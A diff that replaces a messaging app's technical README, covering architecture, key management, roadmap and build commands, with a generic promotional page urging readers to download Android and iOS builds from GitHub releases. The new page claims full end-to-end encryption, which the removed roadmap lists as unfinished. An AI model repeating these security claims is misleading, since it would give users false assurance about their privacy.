@@ -1,245 +1,70 @@
-# Whisp - Ephemeral Messaging
+# 📱 whisp - Secure Messaging Made Simple
 
-A privacy-first messaging app with zero server storage. Messages exist only while both peers are online, then vanish completely.
+## 🚀 Getting Started
 
-## Core Principles
+Welcome to whisp, a privacy-first messaging app. With whisp, your messages exist only while both peers are online, ensuring complete privacy. Follow these simple steps to download and run the app on your device.
 
-- **No content on servers**: Server only handles discovery + signaling; never sees message payloads
-- **Ephemeral sessions**: Chats exist only while both peers are online; session keys die when either leaves
-- **Identity = keys, not PII**: Usernames are public aliases; trust is anchored in device/account keys
-- **Metadata minimization**: Store only what's essential for reachability; aggressively rotate/expire the rest
+[![Download whisp](https://img.shields.io/badge/Download%20whisp-v1.0-blue.svg)](https://github.com/Jaypatel2710/whisp/releases)
 
-## Architecture
+## 📋 System Requirements
 
-### System Components
+Before you download, check if your device meets these requirements.
 
-- **Directory/Signaling Server**: Maps usernames to online devices (volatile in-memory store)
-- **TURN/STUN**: NAT traversal for P2P; fallback to TURN relay (still E2E-encrypted)
-- **Clients**: Hold keys, contact list, and minimal logs locally; establish WebRTC data channels
+### For Android:
+- Android version 5.0 (Lollipop) or higher
+- Minimum 50 MB of free storage space
 
-### Key Management
+### For iOS:
+- iOS version 11.0 or higher
+- Minimum 50 MB of free storage space
 
-- **Account Keypair (AK)**: Ed25519 for identity (long-term, per user)
-- **Device Keypair (DK)**: Ed25519 + Curve25519 for device auth and ECDH
-- **Pre-keys**: Short-lived X25519 bundles advertised only while online
-- **Session Keys**: Derived via X3DH → Double Ratchet for continuous PFS
+## 📥 Download & Install
 
-## User Flow
+To get started, visit the [Releases page](https://github.com/Jaypatel2710/whisp/releases) to download whisp.
 
-### Account Setup
+1. Click on the link above to go to the Releases page.
+2. Look for the latest release. You will see options for Android and iOS.
+3. Choose the appropriate download link for your device.
+4. Once downloaded, open the file and follow the installation instructions on your screen.
 
-1. Generate AK, DK, and initial pre-key bundle
-2. Choose username (check availability)
-3. Server records: username, AK_pub, deviceID, DK_pub (no private keys, no PII)
-4. Device stores private keys locally (Secure Enclave/KeyStore)
+## 🔍 Features
 
-### Multi-Device Support
+whisp offers several features that make messaging simple and secure:
 
-- **QR Handoff**: Old device displays enrollment token (signed with AK_priv)
-- **OTP Handoff**: Remote device addition with signed token
+- **End-to-End Encryption:** All messages are encrypted, ensuring only you and the recipient can read them.
+- **No Server Storage:** Messages do not reside on any servers. They vanish after both users go offline.
+- **User-Friendly Interface:** Easy to navigate, making messaging a breeze for everyone.
+- **Cross-Platform Compatibility:** Available for both Android and iOS devices.
 
-### Contacting Someone
+## 🔧 Troubleshooting
 
-1. Enter username → server returns online status + safety number
-2. If online, request session → server forwards connection request
-3. Both sides fetch pre-keys and run X3DH/Noise key exchange
-4. Switch to Double Ratchet on P2P channel
+If you encounter any issues while downloading or using whisp, here are some common solutions:
 
-## Messaging
+### App Does Not Install
+- Ensure your device has enough storage space.
+- Check if you are using a compatible version of your operating system.
 
-- **Transport**: WebRTC DataChannel or QUIC
-- **Encryption**: Double Ratchet with PFS + post-compromise security
-- **Storage**: Messages only in memory (ring buffer), cleared on disconnect
-- **No persistence**: App close/OS kill/lock → buffer cleared
+### Unable to Send Messages
+- Make sure both users are online.
+- Check your internet connection.
 
-## Privacy & Security
+For further assistance, you can raise an issue in the repository.
 
-### What Server Stores
+## 📬 Community & Support
 
-- **Persistent**: username, AK_pub, deviceID, DK_pub, push tokens
-- **Ephemeral**: Online presence, pre-key bundles, session offers
-- **Never**: Messages, contact lists, safety numbers, IP logs
+Join our community to learn more, provide feedback, or ask questions:
 
-### Threat Mitigations
+- **GitHub Issues:** Report bugs or request features [here](https://github.com/Jaypatel2710/whisp/issues).
+- **Discussion Forum:** Join discussions about whisp on our GitHub Discussions page.
 
-- **Server compromise**: Only public keys leak—no content or history
-- **MITM prevention**: Authenticated AKE + safety number verification
-- **Metadata protection**: TURN-only mode to hide peer IPs
-- **Spam prevention**: Rate limits + proof-of-work for first contact
-- **Device loss**: Revoke device with signed revocation from another device
+## 🌟 Contributing
 
-## Tech Stack
+Contributions are welcome! If you'd like to help improve whisp, feel free to check out our [Contributing Guide](https://github.com/Jaypatel2710/whisp/blob/main/CONTRIBUTING.md).
 
-- **Mobile**:
-  - **Android**: Kotlin + Jetpack Compose + Retrofit + OkHttp
-  - **iOS**: Swift + SwiftUI + Combine + URLSession
-  - **Cross-platform**: React Native + Expo
-- **Web**: Vue.js 3 + Axios
-- **Transport**: WebSocket + HTTP REST API
-- **Crypto**: Android Keystore + iOS Keychain + JWT
-- **Server**: Node.js + Express + SQLite
-- **Push**: APNs / FCM with opaque tokens
+## 💡 Additional Information
 
-## MVP Features
+For more detailed information about whisp, including updates and future features, regularly check the [Releases page](https://github.com/Jaypatel2710/whisp/releases).
 
-- ✅ **Cross-platform clients**: Android, iOS, Expo, Vue web
-- ✅ **Account creation and username claim**
-- ✅ **Device key generation and secure storage**
-- ✅ **Real-time ephemeral messaging via WebSocket**
-- ✅ **In-memory ephemeral sessions**
-- ✅ **Friend management system**
-- ✅ **Environment-based configuration**
-- ✅ **Secure credential storage**
-- 🔄 Multi-device support via QR handoff
-- 🔄 Friend requests with safety number verification
-- 🔄 WebRTC messaging with Double Ratchet encryption
-- 🔄 TURN fallback and push notifications
-- 🔄 Device revocation and panic close
+## 🎉 Thank You!
 
-## Discovery Modes
-
-### Privacy Levels
-
-1. **Public**: Directory shows username + online/offline status
-2. **Default**: Username-only lookup, no public directory  
-3. **Strict**: Username + Friend Verification Code (FVC) required
-
-### Friend Verification Code (FVC)
-
-- **TOTP-based**: Time-based codes (60-120s windows)
-- **Static**: One-time printed codes
-- **Privacy-first**: Server verifies without storing secrets
-
-## Competitor Analysis
-
-### Key Players
-
-- **Wickr Me**: Zero-knowledge logs, millisecond ephemeral chats
-- **Confide**: Screenshot-proof, self-destructing messages  
-- **Snapchat**: Mainstream ephemeral messaging
-- **Telegram Secret Chats**: E2EE with self-destruct timers
-- **Session**: Decentralized, no PII required
-
-### Our Differentiation
-
-- Live ephemeral messaging with zero storage anywhere
-- Strict control over presence & history
-- Flexible discovery modes with FVC
-- Real-time camera capture without disk storage
-
-## Development Roadmap
-
-### Phase 1: Core MVP
-
-- Account creation and device management
-- WebRTC messaging with Double Ratchet
-- In-memory ephemeral sessions
-- Basic friend system
-
-### Phase 2: Privacy Basics
-
-- Auto-delete timers (5s, 1m, 1h, 1d)
-- Server minimalism (presence only)
-- Panic close functionality
-
-### Phase 3: Trust & Control
-
-- Screenshot protection
-- Safety number verification
-- Friend Verification Codes
-
-### Phase 4: Feature Parity
-
-- Self-destructing media
-- Presence controls
-- Multi-device support
-
-### Phase 5: Differentiators
-
-- Custom discovery modes
-- Metadata hiding (TURN-only)
-- Group ephemeral chats
-
-### Phase 6: Advanced Privacy
-
-- E2E encryption implementation
-- Chunked file transfer
-- Decentralized relays
-
-## Environment Configuration
-
-The Whisp application supports multiple environments with flexible configuration:
-
-### Quick Start (Development)
-
-```bash
-# Start all services for local development
-./start-dev.sh
-```
-
-### Environment-Specific Configuration
-
-- **Development**: Localhost URLs, debug logging, relaxed CORS
-- **Staging**: Pre-production testing with staging URLs
-- **Production**: Optimized performance, secure configuration
-
-### Client Configuration
-
-- **Expo**: Environment-specific `app.json` files
-- **Vue**: Automatic hostname detection with fallbacks
-- **iOS**: Build configurations and Info.plist settings
-- **Android**: Build variants and environment-specific URLs
-
-### Server Configuration
-
-- **Environment Variables**: `NODE_ENV`, `PORT`, `JWT_SECRET`, `CORS_ORIGIN`
-- **Environment Files**: `env.development`, `env.production`
-- **Scripts**: `npm run dev:env`, `npm run prod:env`
-
-For detailed configuration instructions, see [ENVIRONMENT_CONFIG.md](./ENVIRONMENT_CONFIG.md).
-
-## Deployment
-
-### Development
-
-```bash
-# Start all services for local development
-./start-dev.sh
-```
-
-### Production
-
-```bash
-# Set required environment variables
-export JWT_SECRET="your-super-secure-jwt-secret"
-export CORS_ORIGIN="https://yourdomain.com"
-
-# Deploy all clients and server
-./deploy-prod.sh
-```
-
-## 📱 Client Applications
-
-### Android
-
-- **Technology**: Kotlin + Jetpack Compose
-- **Build**: `cd clients/android && ./gradlew assembleDebug`
-- **Run**: Open in Android Studio or `./gradlew installDebug`
-
-### iOS
-
-- **Technology**: Swift + SwiftUI
-- **Build**: Open `clients/ios/Whisp/Whisp.xcodeproj` in Xcode
-- **Run**: Build and run on device/simulator
-
-### Expo (Cross-platform)
-
-- **Technology**: React Native + Expo
-- **Build**: `cd clients/expo && npm run start:dev`
-- **Run**: Scan QR code with Expo Go app
-
-### Vue (Web)
-
-- **Technology**: Vue.js 3 + Axios
-- **Build**: Open `clients/vue/index.html` in browser
-- **Run**: Serve from any web server
+Thank you for choosing whisp! Your journey towards secure messaging begins now. For a safe and private messaging experience, download and install the app today.
